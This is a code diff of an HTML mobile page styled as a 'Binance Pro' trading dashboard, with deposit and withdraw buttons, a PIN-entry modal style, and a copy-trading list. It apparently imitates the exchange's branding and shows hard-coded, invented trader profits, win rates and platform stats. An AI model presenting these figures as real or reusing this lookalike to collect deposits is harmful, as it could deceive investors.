@@ -3,283 +3,521 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>Binance Pro - Advanced Dashboard</title>
+    <title>Binance Pro - Advanced Trading Dashboard</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <script src="https://unpkg.com/lucide@latest"></script>
     <script src="https://cdn.jsdelivr.net/npm/chart.js@4.4.0/dist/chart.umd.min.js"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        :root { --binance-yellow: #FCD535; --bg-dark: #0B0E11; --bg-card: #1E2329; --bg-hover: #2B3139; --green: #0ECB81; --red: #F6465D; --blue: #2E7D9E; }
-        body, html { width: 100%; height: 100%; background-color: var(--bg-dark); font-family: 'Inter', 'Segoe UI', sans-serif; overflow: hidden; color: #EAECEF; }
-        ::-webkit-scrollbar { width: 4px; height: 4px; }
-        ::-webkit-scrollbar-track { background: #1E2329; }
-        ::-webkit-scrollbar-thumb { background: #FCD535; border-radius: 10px; }
-        .glass-card { background: rgba(30, 35, 41, 0.7); backdrop-filter: blur(12px); border: 1px solid rgba(252, 213, 53, 0.15); }
-        .view-section { display: none; animation: fadeIn 0.3s ease; }
-        .view-section.active { display: block; }
+        body { background: #0B0E11; font-family: 'Segoe UI', 'Inter', sans-serif; overflow-x: hidden; }
+        
+        ::-webkit-scrollbar { width: 4px; }
+        ::-webkit-scrollbar-track { background: #1e2329; }
+        ::-webkit-scrollbar-thumb { background: #f0b90b; border-radius: 4px; }
+        
+        .glass-card { background: rgba(30, 35, 41, 0.7); backdrop-filter: blur(10px); border: 1px solid rgba(252, 213, 53, 0.15); }
+        .gradient-border { position: relative; background: #1e2329; border-radius: 20px; }
+        
+        .loading-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.95); z-index: 10000; display: none; justify-content: center; align-items: center; flex-direction: column; backdrop-filter: blur(8px); }
+        .loading-ring { width: 80px; height: 80px; border: 3px solid rgba(252,213,53,0.2); border-top: 3px solid #f0b90b; border-radius: 50%; animation: spin 1s linear infinite; }
+        .loading-ring-secondary { width: 60px; height: 60px; border: 3px solid rgba(14,203,129,0.2); border-top: 3px solid #0ecb81; border-radius: 50%; animation: spin 0.8s linear infinite reverse; position: absolute; }
+        @keyframes spin { 100% { transform: rotate(360deg); } }
+        .loading-progress { width: 280px; height: 4px; background: #2b3139; border-radius: 4px; margin-top: 30px; overflow: hidden; }
+        .loading-progress-fill { width: 0%; height: 100%; background: linear-gradient(90deg, #f0b90b, #0ecb81); border-radius: 4px; transition: width 0.1s linear; }
+        
+        .pin-modal { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); z-index: 10001; display: none; justify-content: center; align-items: center; }
+        .pin-container { background: #1e2329; border-radius: 28px; padding: 32px; width: 90%; max-width: 400px; border: 1px solid rgba(252,213,53,0.3); }
+        .pin-input { width: 100%; text-align: center; letter-spacing: 8px; font-size: 28px; font-weight: bold; background: #2b3139; border: 2px solid #3b424d; border-radius: 16px; padding: 16px; color: white; font-family: monospace; }
+        .pin-input:focus { outline: none; border-color: #f0b90b; }
+        
+        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); z-index: 10002; justify-content: center; align-items: center; }
+        .modal.active { display: flex; }
+        .modal-content { background: #1e2329; border-radius: 24px; padding: 24px; width: 90%; max-width: 400px; border: 1px solid rgba(252,213,53,0.3); position: relative; }
+        .modal-close { position: absolute; top: 16px; right: 16px; cursor: pointer; color: #848e9c; }
+        .funds-modal-input { background: #2b2f36; border: 1px solid #3b424d; border-radius: 12px; padding: 14px; color: white; width: 100%; margin-bottom: 16px; }
+        
+        .stat-card { background: #1e2329; border-radius: 20px; padding: 20px; transition: transform 0.2s; }
+        .stat-card:hover { transform: translateY(-2px); }
+        .trader-card { background: #1e2329; border-radius: 20px; padding: 20px; transition: all 0.2s; cursor: pointer; }
+        .trader-card:hover { transform: translateY(-3px); background: #2a2f38; }
+        .btn-copy { background: linear-gradient(135deg, #f0b90b, #fcd535); color: #181a20; font-weight: bold; padding: 8px 20px; border-radius: 30px; transition: all 0.2s; border: none; cursor: pointer; }
+        .btn-copy:hover { transform: scale(1.05); }
+        
+        .market-row { display: flex; justify-content: space-between; align-items: center; padding: 14px 0; border-bottom: 1px solid #2b3139; cursor: pointer; }
+        .market-row:hover { background: #252a32; margin: 0 -12px; padding: 14px 12px; border-radius: 12px; }
+        .price-up { color: #0ecb81; }
+        .price-down { color: #f6465d; }
+        
+        .quick-action-btn { background: #2b3139; border-radius: 12px; padding: 12px; text-align: center; cursor: pointer; transition: all 0.2s; }
+        .quick-action-btn:hover { background: #363c45; transform: translateY(-2px); }
+        
+        .nav-item { display: flex; flex-direction: column; align-items: center; gap: 4px; cursor: pointer; transition: all 0.2s; padding: 8px 16px; border-radius: 12px; }
+        .nav-item.active { background: #f0b90b20; color: #f0b90b; }
+        
+        .toast { position: fixed; bottom: 100px; left: 50%; transform: translateX(-50%); background: #0ecb81; color: white; padding: 12px 24px; border-radius: 40px; font-size: 13px; font-weight: bold; z-index: 10002; opacity: 0; transition: opacity 0.3s; pointer-events: none; }
+        .toast.error { background: #f6465d; }
+        
         @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
-        .profit-positive { color: var(--green); }
-        .profit-negative { color: var(--red); }
-        .loading-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(11, 14, 17, 0.95); backdrop-filter: blur(8px); z-index: 20000; display: flex; justify-content: center; align-items: center; flex-direction: column; visibility: hidden; opacity: 0; transition: all 0.3s ease; }
-        .loading-overlay.active { visibility: visible; opacity: 1; }
-        .spinner { width: 60px; height: 60px; border: 4px solid rgba(252, 213, 53, 0.2); border-top: 4px solid var(--binance-yellow); border-radius: 50%; animation: spin 1s cubic-bezier(0.68, -0.55, 0.265, 1.55) infinite; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        .pulse-dot { width: 8px; height: 8px; background-color: var(--green); border-radius: 50%; display: inline-block; animation: pulse 1.5s infinite; }
-        @keyframes pulse { 0% { opacity: 0.4; transform: scale(0.8); } 100% { opacity: 1; transform: scale(1.2); } }
-        .market-up { color: var(--green); }
-        .market-down { color: var(--red); }
-        .nav-item { transition: all 0.2s; }
-        .nav-item.active { color: var(--binance-yellow); border-bottom: 2px solid var(--binance-yellow); }
-        .candle-stick { width: 4px; background: var(--green); position: relative; display: inline-block; margin: 0 1px; }
-        .progress-bar-fill { transition: width 0.5s ease; }
-        .hover-scale { transition: transform 0.2s, box-shadow 0.2s; }
-        .hover-scale:hover { transform: translateY(-2px); box-shadow: 0 8px 25px rgba(0,0,0,0.3); }
+        .fade-in { animation: fadeIn 0.4s ease-out; }
     </style>
 </head>
 <body>
 
-<div id="loadingPaymentOverlay" class="loading-overlay">
-    <div class="spinner mb-4"></div>
-    <div class="text-binance-yellow text-lg font-bold tracking-wider">PROCESSING TRANSACTION</div>
-    <div class="text-gray-400 text-sm mt-2">Please wait, redirecting to secure gateway...</div>
-    <div class="flex gap-1 mt-4"><div class="w-2 h-2 rounded-full bg-binance-yellow animate-pulse"></div><div class="w-2 h-2 rounded-full bg-binance-yellow animate-pulse delay-100"></div><div class="w-2 h-2 rounded-full bg-binance-yellow animate-pulse delay-200"></div></div>
-</div>
-
-<div id="mainApp" style="height: 100%; overflow-y: auto; position: relative;">
-    <div class="max-w-md mx-auto relative pb-24">
-        <!-- Header Area -->
-        <div class="sticky top-0 z-40 glass-card px-4 pt-4 pb-2">
-            <div class="flex justify-between items-center text-xs font-medium">
-                <div class="flex gap-4"><span class="text-binance-yellow border-b border-binance-yellow pb-1">Spot</span><span class="text-gray-500">Margin</span><span class="text-gray-500">Futures</span></div>
-                <div class="flex gap-3"><i data-lucide="search" class="w-4 h-4 cursor-pointer text-gray-400 hover:text-white" onclick="openSearchModal()"></i><i data-lucide="bell" class="w-4 h-4 cursor-pointer text-gray-400 hover:text-white" onclick="showNotifications()"></i><i data-lucide="sun-moon" class="w-4 h-4 cursor-pointer text-gray-400 hover:text-white" onclick="toggleTheme()"></i></div>
+<div style="max-width: 500px; margin: 0 auto; background: #0B0E11; min-height: 100vh; padding-bottom: 80px; position: relative;">
+    
+    <!-- Header -->
+    <div class="px-4 pt-4 sticky top-0 bg-[#0B0E11] z-50 pb-2">
+        <div class="flex justify-between items-center">
+            <div class="flex items-center gap-2">
+                <div class="w-8 h-8 bg-gradient-to-br from-yellow-500 to-yellow-600 rounded-xl flex items-center justify-center">
+                    <span class="text-black font-bold text-sm">B</span>
+                </div>
+                <span class="text-white font-bold text-lg">Binance Pro</span>
             </div>
-            <div class="flex justify-between items-center mt-3">
-                <div class="flex gap-2"><button onclick="showView('home')" class="px-4 py-1.5 rounded-lg bg-binance-yellow text-black font-bold text-sm shadow-lg">Dashboard</button><button onclick="window.location.href='wallets.html'" class="px-4 py-1.5 rounded-lg bg-[#2B3139] text-gray-300 font-bold text-sm">Wallet</button></div>
-                <div class="flex items-center gap-3">
-                    <div class="relative cursor-pointer" onclick="toggleProfilePopup()"><div class="w-8 h-8 rounded-full bg-gradient-to-r from-binance-yellow to-orange-500 flex items-center justify-center"><i data-lucide="user" class="w-4 h-4 text-black"></i></div><span class="absolute bottom-0 right-0 w-2.5 h-2.5 bg-green-500 rounded-full border-2 border-[#1E2329]"></span></div>
+            <div class="flex gap-3">
+                <i data-lucide="bell" class="w-5 h-5 text-gray-400 cursor-pointer"></i>
+                <i data-lucide="settings" class="w-5 h-5 text-gray-400 cursor-pointer"></i>
+                <div class="w-8 h-8 bg-gray-700 rounded-full flex items-center justify-center cursor-pointer border border-gray-600">
+                    <i data-lucide="user" class="w-4 h-4 text-white"></i>
                 </div>
             </div>
         </div>
-
-        <!-- Home View -->
-        <div id="view-home" class="view-section active px-4 space-y-5 mt-4">
-            <!-- Balance Card Pro -->
-            <div class="bg-gradient-to-br from-[#1E2329] to-[#13161D] rounded-2xl p-5 border border-gray-800 shadow-xl">
-                <div class="flex justify-between items-start">
-                    <div><span class="text-gray-400 text-xs font-semibold">TOTAL BALANCE (USDT)</span><h1 class="text-4xl font-black mt-1 tracking-tight" id="mainBalanceDisplay">$12,450.75</h1><div class="flex items-center gap-2 mt-2"><span class="text-xs text-gray-400">≈ 0.1765 BTC</span><span class="px-2 py-0.5 rounded-full bg-green-500/20 text-green-500 text-[10px] font-bold">+5.23%</span></div></div>
-                    <button onclick="openAddFundsModal()" class="bg-binance-yellow text-black px-5 py-2.5 rounded-xl font-bold text-sm shadow-lg hover:shadow-xl transition-all active:scale-95">DEPOSIT</button>
+        
+        <div class="mt-3 relative">
+            <i data-lucide="search" class="absolute left-3 top-1/2 transform -translate-y-1/2 w-4 h-4 text-gray-500"></i>
+            <input type="text" placeholder="Search markets, assets..." class="w-full bg-[#1e2329] rounded-xl py-3 pl-10 pr-4 text-white text-sm border border-gray-700 focus:border-yellow-500 outline-none">
+        </div>
+    </div>
+    
+    <!-- Balance Section -->
+    <div class="px-4 mt-4">
+        <div class="glass-card rounded-2xl p-5">
+            <div class="flex justify-between items-start">
+                <div>
+                    <span class="text-gray-400 text-xs uppercase tracking-wider">Total Balance</span>
+                    <div class="flex items-center gap-2 mt-1">
+                        <h1 class="text-3xl font-bold text-white" id="mainBalance">$0.00</h1>
+                        <i data-lucide="eye-off" class="w-4 h-4 text-gray-500 cursor-pointer" id="toggleBalance"></i>
+                    </div>
+                    <div class="flex items-center gap-2 mt-2">
+                        <span class="text-green-500 text-sm" id="dailyChange">+$0.00 (+0%)</span>
+                        <span class="text-xs text-gray-500">Today</span>
+                    </div>
                 </div>
-                <div class="grid grid-cols-3 gap-3 mt-5 pt-3 border-t border-gray-800">
-                    <div><p class="text-[10px] text-gray-500">24h Change</p><p class="text-sm font-bold text-green-500" id="dailyPnl">+$342.12</p></div>
-                    <div><p class="text-[10px] text-gray-500">Assets</p><p class="text-sm font-bold">8</p></div>
-                    <div><p class="text-[10px] text-gray-500">Open Orders</p><p class="text-sm font-bold">2</p></div>
-                </div>
+                <button id="addFundsBtn" class="bg-gradient-to-r from-yellow-500 to-yellow-600 text-black px-5 py-2.5 rounded-xl font-bold text-sm shadow-lg shadow-yellow-500/20">+ Add Funds</button>
             </div>
-
-            <!-- Pro Quick Actions -->
-            <div class="grid grid-cols-4 gap-3">
-                <div class="bg-[#1E2329] p-3 rounded-xl text-center cursor-pointer hover:bg-[#2B3139] transition" onclick="window.location.href='trade.html'"><i data-lucide="arrow-left-right" class="w-5 h-5 text-binance-yellow mx-auto mb-1"></i><span class="text-[10px] font-bold">Trade</span></div>
-                <div class="bg-[#1E2329] p-3 rounded-xl text-center cursor-pointer hover:bg-[#2B3139] transition" onclick="window.location.href='wallets.html'"><i data-lucide="download" class="w-5 h-5 text-green-500 mx-auto mb-1"></i><span class="text-[10px] font-bold">Deposit</span></div>
-                <div class="bg-[#1E2329] p-3 rounded-xl text-center cursor-pointer hover:bg-[#2B3139] transition" onclick="window.location.href='wallets.html'"><i data-lucide="upload" class="w-5 h-5 text-red-500 mx-auto mb-1"></i><span class="text-[10px] font-bold">Withdraw</span></div>
-                <div class="bg-[#1E2329] p-3 rounded-xl text-center cursor-pointer hover:bg-[#2B3139] transition" onclick="openConvertModal()"><i data-lucide="repeat" class="w-5 h-5 text-blue-500 mx-auto mb-1"></i><span class="text-[10px] font-bold">Convert</span></div>
-            </div>
-
-            <!-- Advanced Portfolio Chart -->
-            <div class="bg-[#1E2329] rounded-2xl p-4 border border-gray-800">
-                <div class="flex justify-between items-center mb-3"><span class="text-gray-400 text-xs font-bold">PORTFOLIO PERFORMANCE (30D)</span><span class="text-green-500 text-xs font-mono">+18.4% ▲</span></div>
-                <canvas id="advancedPortfolioChart" height="110"></canvas>
-                <div class="flex justify-between text-[9px] text-gray-500 mt-2"><span>Week 1</span><span>Week 2</span><span>Week 3</span><span>Week 4</span></div>
-            </div>
-
-            <!-- Live Market Ticker & Fear & Greed -->
-            <div class="grid grid-cols-2 gap-3">
-                <div class="bg-[#1E2329] rounded-2xl p-4 border border-gray-800">
-                    <div class="text-gray-400 text-[10px] mb-2">FEAR & GREED INDEX</div>
-                    <div class="text-3xl font-black" id="fearGreedValue">42</div>
-                    <div class="text-xs font-bold text-yellow-500">Fear</div>
-                    <div class="mt-2 h-1.5 w-full bg-gray-800 rounded-full overflow-hidden"><div id="fearGreedBar" class="h-full w-[42%] bg-yellow-500"></div></div>
-                </div>
-                <div class="bg-[#1E2329] rounded-2xl p-4 border border-gray-800">
-                    <div class="text-gray-400 text-[10px] mb-2">GLOBAL MARKET CAP</div>
-                    <div class="text-xl font-black">$2.41T</div>
-                    <div class="text-green-500 text-[10px]">+1.2% (24h)</div>
-                    <div class="mt-2 flex gap-1 text-[8px]"><span class="bg-green-500/20 px-1 rounded">BTC Dominance: 52%</span></div>
-                </div>
-            </div>
-
-            <!-- Top Movers Table (Realistic) -->
-            <div class="bg-[#1E2329] rounded-2xl p-4 border border-gray-800">
-                <div class="flex justify-between items-center mb-3"><span class="text-gray-400 text-xs font-bold">🔥 TOP MOVERS (24H)</span><i data-lucide="trending-up" class="w-4 h-4 text-binance-yellow"></i></div>
-                <div id="topMoversList" class="space-y-3"></div>
-            </div>
-
-            <!-- Allocation & Recent Activity Split -->
-            <div class="grid grid-cols-2 gap-3">
-                <div class="bg-[#1E2329] rounded-2xl p-3 border border-gray-800">
-                    <div class="text-gray-400 text-[10px] mb-2">ASSET ALLOCATION</div>
-                    <canvas id="donutAllocation" height="100"></canvas>
-                    <div id="allocationLegend" class="mt-2 text-[8px]"></div>
-                </div>
-                <div class="bg-[#1E2329] rounded-2xl p-3 border border-gray-800">
-                    <div class="text-gray-400 text-[10px] mb-2">RECENT ACTIVITY</div>
-                    <div id="activityFeed" class="space-y-2 max-h-32 overflow-y-auto"></div>
-                </div>
-            </div>
-
-            <!-- Copy Trading Elite Section -->
-            <div class="bg-gradient-to-r from-[#1E2329] to-[#0F1117] rounded-2xl p-4 border border-yellow-500/20">
-                <div class="flex items-center gap-2 mb-3"><i data-lucide="crown" class="w-4 h-4 text-binance-yellow"></i><span class="text-xs font-bold uppercase tracking-wider">Elite Copy Traders</span></div>
-                <div id="eliteTraders" class="flex overflow-x-auto gap-3 pb-2"></div>
-            </div>
-            
-            <!-- Binance Earn Banner -->
-            <div class="bg-[#1E2329] rounded-2xl p-4 border border-blue-500/30 bg-gradient-to-r from-blue-900/20 to-transparent">
-                <div class="flex justify-between items-center"><div><span class="text-xs font-bold text-blue-400">Earn up to 15% APR</span><p class="text-[10px] text-gray-400">Flexible savings on USDT</p></div><button class="bg-blue-600 px-4 py-1.5 rounded-lg text-xs font-bold">Earn Now</button></div>
+            <div class="flex justify-between mt-4 pt-3 border-t border-gray-700">
+                <div><span class="text-gray-500 text-xs">BTC</span><p class="text-white font-bold" id="btcAmount">0.0000 BTC</p></div>
+                <div><span class="text-gray-500 text-xs">ETH</span><p class="text-white font-bold" id="ethAmount">0.0000 ETH</p></div>
+                <div><span class="text-gray-500 text-xs">USDT</span><p class="text-white font-bold" id="usdtAmount">$0.00</p></div>
             </div>
         </div>
-
-        <!-- Bottom Navigation -->
-        <nav class="fixed bottom-0 left-0 right-0 max-w-md mx-auto bg-[#1E2329] border-t border-gray-800 px-4 py-2 flex justify-between z-50 backdrop-blur-md bg-opacity-95">
-            <div onclick="showView('home')" id="nav-home" class="flex flex-col items-center gap-0.5 cursor-pointer text-binance-yellow"><i data-lucide="home" class="w-5 h-5"></i><span class="text-[9px] font-bold">Home</span></div>
-            <div onclick="window.location.href='markets.html'" class="flex flex-col items-center gap-0.5 text-gray-500 cursor-pointer"><i data-lucide="bar-chart-2" class="w-5 h-5"></i><span class="text-[9px] font-bold">Markets</span></div>
-            <div onclick="window.location.href='trade.html'" class="flex flex-col items-center gap-0.5 text-gray-500 cursor-pointer"><i data-lucide="arrow-left-right" class="w-5 h-5"></i><span class="text-[9px] font-bold">Trade</span></div>
-            <div onclick="window.location.href='futures.html'" class="flex flex-col items-center gap-0.5 text-gray-500 cursor-pointer"><i data-lucide="zap" class="w-5 h-5"></i><span class="text-[9px] font-bold">Futures</span></div>
-            <div onclick="window.location.href='wallets.html'" class="flex flex-col items-center gap-0.5 text-gray-500 cursor-pointer"><i data-lucide="wallet" class="w-5 h-5"></i><span class="text-[9px] font-bold">Wallet</span></div>
-        </nav>
+    </div>
+    
+    <!-- Quick Action Buttons (ORIGINAL FUNCTIONALITY) -->
+    <div class="grid grid-cols-4 gap-2 px-4 mt-4 mb-6">
+        <div class="quick-action-btn" onclick="openDepositModal()">
+            <i data-lucide="plus-circle" class="w-5 h-5 mx-auto mb-1 text-green-500"></i>
+            <span class="text-[10px] text-gray-300">Deposit</span>
+        </div>
+        <div class="quick-action-btn" onclick="handleWithdraw()">
+            <i data-lucide="minus-circle" class="w-5 h-5 mx-auto mb-1 text-red-500"></i>
+            <span class="text-[10px] text-gray-300">Withdraw</span>
+        </div>
+        <div class="quick-action-btn" onclick="window.location.href='trade.html'">
+            <i data-lucide="arrow-left-right" class="w-5 h-5 mx-auto mb-1 text-yellow-500"></i>
+            <span class="text-[10px] text-gray-300">Trade</span>
+        </div>
+        <div class="quick-action-btn" onclick="openTransferModal()">
+            <i data-lucide="send" class="w-5 h-5 mx-auto mb-1 text-blue-500"></i>
+            <span class="text-[10px] text-gray-300">Transfer</span>
+        </div>
+    </div>
+    
+    <!-- Portfolio Chart -->
+    <div class="px-4 mt-2">
+        <div class="bg-[#1e2329] rounded-2xl p-4">
+            <div class="flex justify-between items-center mb-3"><span class="text-white font-bold">Portfolio Performance</span><div class="flex gap-2"><button class="text-xs px-2 py-1 rounded bg-yellow-500 text-black">1M</button><button class="text-xs px-2 py-1 rounded bg-[#2b3139] text-gray-400">3M</button><button class="text-xs px-2 py-1 rounded bg-[#2b3139] text-gray-400">1Y</button></div></div>
+            <canvas id="portfolioChart" height="150" style="width:100%"></canvas>
+        </div>
+    </div>
+    
+    <!-- Stats Grid -->
+    <div class="px-4 mt-4">
+        <div class="grid grid-cols-2 gap-3">
+            <div class="stat-card"><div class="flex items-center gap-2"><i data-lucide="trending-up" class="w-4 h-4 text-green-500"></i><span class="text-gray-500 text-xs">24h Volume</span></div><p class="text-white font-bold text-lg mt-1">$2.4M</p><span class="text-green-500 text-xs">+12.5%</span></div>
+            <div class="stat-card"><div class="flex items-center gap-2"><i data-lucide="users" class="w-4 h-4 text-yellow-500"></i><span class="text-gray-500 text-xs">Active Traders</span></div><p class="text-white font-bold text-lg mt-1">12,847</p><span class="text-green-500 text-xs">+342 today</span></div>
+            <div class="stat-card"><div class="flex items-center gap-2"><i data-lucide="shield" class="w-4 h-4 text-blue-500"></i><span class="text-gray-500 text-xs">Security Score</span></div><p class="text-white font-bold text-lg mt-1">98/100</p><span class="text-green-500 text-xs">Excellent</span></div>
+            <div class="stat-card"><div class="flex items-center gap-2"><i data-lucide="clock" class="w-4 h-4 text-purple-500"></i><span class="text-gray-500 text-xs">Avg Response</span></div><p class="text-white font-bold text-lg mt-1">0.8s</p><span class="text-green-500 text-xs">-0.2s</span></div>
+        </div>
+    </div>
+    
+    <!-- Fear & Greed + Sentiment -->
+    <div class="px-4 mt-4">
+        <div class="grid grid-cols-2 gap-3">
+            <div class="bg-[#1e2329] rounded-2xl p-4"><span class="text-gray-500 text-xs uppercase">Fear & Greed Index</span><div class="mt-2"><span class="text-3xl font-bold text-white">42</span><span class="text-gray-400 ml-2">/100</span></div><div class="mt-2 h-2 bg-gradient-to-r from-red-500 via-yellow-500 to-green-500 rounded-full"><div class="h-full w-[42%] bg-white/30 rounded-full"></div></div><span class="text-yellow-500 text-xs mt-2 block">Fear 😐</span></div>
+            <div class="bg-[#1e2329] rounded-2xl p-4"><span class="text-gray-500 text-xs uppercase">Market Sentiment</span><div class="mt-2"><span class="text-3xl font-bold text-white">55</span><span class="text-gray-400 ml-2">% Bullish</span></div><div class="mt-2 h-2 bg-[#2b3139] rounded-full"><div class="h-full w-[55%] bg-green-500 rounded-full"></div></div><span class="text-green-500 text-xs mt-2 block">Neutral to Bullish</span></div>
+        </div>
+    </div>
+    
+    <!-- Top Movers -->
+    <div class="px-4 mt-4">
+        <div class="flex justify-between items-center mb-3"><span class="text-white font-bold">🔥 Top Movers (24h)</span><span class="text-yellow-500 text-xs">View All →</span></div>
+        <div class="space-y-2">
+            <div class="market-row"><div class="flex items-center gap-3"><div class="w-8 h-8 bg-orange-500/20 rounded-full flex items-center justify-center"><span class="text-orange-500 text-sm">₿</span></div><div><div class="text-white font-medium">BTC</div><div class="text-gray-500 text-xs">Bitcoin</div></div></div><div class="text-right"><div class="text-white font-medium">$69,420</div><div class="price-up text-xs">+2.34%</div></div></div>
+            <div class="market-row"><div class="flex items-center gap-3"><div class="w-8 h-8 bg-blue-500/20 rounded-full flex items-center justify-center"><span class="text-blue-500 text-sm">Ξ</span></div><div><div class="text-white font-medium">ETH</div><div class="text-gray-500 text-xs">Ethereum</div></div></div><div class="text-right"><div class="text-white font-medium">$3,520</div><div class="price-up text-xs">+1.82%</div></div></div>
+            <div class="market-row"><div class="flex items-center gap-3"><div class="w-8 h-8 bg-purple-500/20 rounded-full flex items-center justify-center"><span class="text-purple-500 text-sm">S</span></div><div><div class="text-white font-medium">SOL</div><div class="text-gray-500 text-xs">Solana</div></div></div><div class="text-right"><div class="text-white font-medium">$178.50</div><div class="price-up text-xs">+5.67%</div></div></div>
+        </div>
+    </div>
+    
+    <!-- Asset Allocation -->
+    <div class="px-4 mt-4">
+        <div class="bg-[#1e2329] rounded-2xl p-4">
+            <span class="text-white font-bold">📊 Asset Allocation</span>
+            <canvas id="allocationChart" height="120" class="mt-3"></canvas>
+            <div class="grid grid-cols-3 gap-2 mt-3"><div class="text-center"><div class="w-3 h-3 rounded-full bg-yellow-500 mx-auto mb-1"></div><span class="text-gray-400 text-xs">BTC 45%</span></div><div class="text-center"><div class="w-3 h-3 rounded-full bg-blue-500 mx-auto mb-1"></div><span class="text-gray-400 text-xs">ETH 28%</span></div><div class="text-center"><div class="w-3 h-3 rounded-full bg-green-500 mx-auto mb-1"></div><span class="text-gray-400 text-xs">Others 27%</span></div></div>
+        </div>
+    </div>
+    
+    <!-- PROFESSIONAL COPY TRADING SECTION -->
+    <div class="px-4 mt-4">
+        <div class="flex justify-between items-center mb-3"><span class="text-white font-bold text-lg">🎯 Elite Copy Trading</span><span class="text-yellow-500 text-xs">Top Performers →</span></div>
+        <div class="space-y-3" id="copyTradingList">
+            <div class="trader-card"><div class="flex justify-between items-start"><div class="flex items-center gap-3"><div class="w-12 h-12 bg-gradient-to-br from-yellow-400 to-yellow-600 rounded-full flex items-center justify-center text-xl">👑</div><div><div class="text-white font-bold">CryptoKing</div><div class="text-gray-500 text-xs">12,345 followers</div></div></div><button class="btn-copy text-sm copy-trade-btn" data-trader="CryptoKing">Copy Trade</button></div><div class="grid grid-cols-4 gap-2 mt-3 text-center"><div><div class="text-gray-500 text-[10px]">7D PNL</div><div class="text-green-500 font-bold">+$125.4K</div></div><div><div class="text-gray-500 text-[10px]">ROI</div><div class="text-green-500 font-bold">+45.2%</div></div><div><div class="text-gray-500 text-[10px]">Win Rate</div><div class="text-white font-bold">89%</div></div><div><div class="text-gray-500 text-[10px]">AUM</div><div class="text-white font-bold">$2.5M</div></div></div></div>
+            <div class="trader-card"><div class="flex justify-between items-start"><div class="flex items-center gap-3"><div class="w-12 h-12 bg-gradient-to-br from-purple-400 to-purple-600 rounded-full flex items-center justify-center text-xl">🌙</div><div><div class="text-white font-bold">MoonTrader</div><div class="text-gray-500 text-xs">8,902 followers</div></div></div><button class="btn-copy text-sm copy-trade-btn" data-trader="MoonTrader">Copy Trade</button></div><div class="grid grid-cols-4 gap-2 mt-3 text-center"><div><div class="text-gray-500 text-[10px]">7D PNL</div><div class="text-green-500 font-bold">+$98.7K</div></div><div><div class="text-gray-500 text-[10px]">ROI</div><div class="text-green-500 font-bold">+32.1%</div></div><div><div class="text-gray-500 text-[10px]">Win Rate</div><div class="text-white font-bold">85%</div></div><div><div class="text-gray-500 text-[10px]">AUM</div><div class="text-white font-bold">$1.8M</div></div></div></div>
+            <div class="trader-card"><div class="flex justify-between items-start"><div class="flex items-center gap-3"><div class="w-12 h-12 bg-gradient-to-br from-blue-400 to-blue-600 rounded-full flex items-center justify-center text-xl">🐋</div><div><div class="text-white font-bold">WhaleHunter</div><div class="text-gray-500 text-xs">6,781 followers</div></div></div><button class="btn-copy text-sm copy-trade-btn" data-trader="WhaleHunter">Copy Trade</button></div><div class="grid grid-cols-4 gap-2 mt-3 text-center"><div><div class="text-gray-500 text-[10px]">7D PNL</div><div class="text-green-500 font-bold">+$87.4K</div></div><div><div class="text-gray-500 text-[10px]">ROI</div><div class="text-green-500 font-bold">+28.4%</div></div><div><div class="text-gray-500 text-[10px]">Win Rate</div><div class="text-white font-bold">92%</div></div><div><div class="text-gray-500 text-[10px]">AUM</div><div class="text-white font-bold">$2.1M</div></div></div></div>
+            <div class="trader-card"><div class="flex justify-between items-start"><div class="flex items-center gap-3"><div class="w-12 h-12 bg-gradient-to-br from-green-400 to-green-600 rounded-full flex items-center justify-center text-xl">📊</div><div><div class="text-white font-bold">AlphaSignals</div><div class="text-gray-500 text-xs">5,234 followers</div></div></div><button class="btn-copy text-sm copy-trade-btn" data-trader="AlphaSignals">Copy Trade</button></div><div class="grid grid-cols-4 gap-2 mt-3 text-center"><div><div class="text-gray-500 text-[10px]">7D PNL</div><div class="text-green-500 font-bold">+$76.5K</div></div><div><div class="text-gray-500 text-[10px]">ROI</div><div class="text-green-500 font-bold">+35.7%</div></div><div><div class="text-gray-500 text-[10px]">Win Rate</div><div class="text-white font-bold">78%</div></div><div><div class="text-gray-500 text-[10px]">AUM</div><div class="text-white font-bold">$1.2M</div></div></div></div>
+            <div class="trader-card"><div class="flex justify-between items-start"><div class="flex items-center gap-3"><div class="w-12 h-12 bg-gradient-to-br from-red-400 to-red-600 rounded-full flex items-center justify-center text-xl">🚀</div><div><div class="text-white font-bold">RocketTrader</div><div class="text-gray-500 text-xs">4,567 followers</div></div></div><button class="btn-copy text-sm copy-trade-btn" data-trader="RocketTrader">Copy Trade</button></div><div class="grid grid-cols-4 gap-2 mt-3 text-center"><div><div class="text-gray-500 text-[10px]">7D PNL</div><div class="text-green-500 font-bold">+$65.3K</div></div><div><div class="text-gray-500 text-[10px]">ROI</div><div class="text-green-500 font-bold">+52.8%</div></div><div><div class="text-gray-500 text-[10px]">Win Rate</div><div class="text-white font-bold">88%</div></div><div><div class="text-gray-500 text-[10px]">AUM</div><div class="text-white font-bold">$980K</div></div></div></div>
+        </div>
+    </div>
+    
+    <!-- Recent Activity -->
+    <div class="px-4 mt-4">
+        <div class="bg-[#1e2329] rounded-2xl p-4">
+            <span class="text-white font-bold">🕐 Recent Activity</span>
+            <div class="space-y-3 mt-3">
+                <div class="flex justify-between items-center"><div class="flex items-center gap-2"><i data-lucide="arrow-down-circle" class="w-4 h-4 text-green-500"></i><span class="text-sm text-white">Deposit</span></div><span class="text-green-500">+$500.00</span><span class="text-gray-500 text-xs">2h ago</span></div>
+                <div class="flex justify-between items-center"><div class="flex items-center gap-2"><i data-lucide="repeat" class="w-4 h-4 text-blue-500"></i><span class="text-sm text-white">BTC Buy</span></div><span class="text-red-500">-$1,200.00</span><span class="text-gray-500 text-xs">5h ago</span></div>
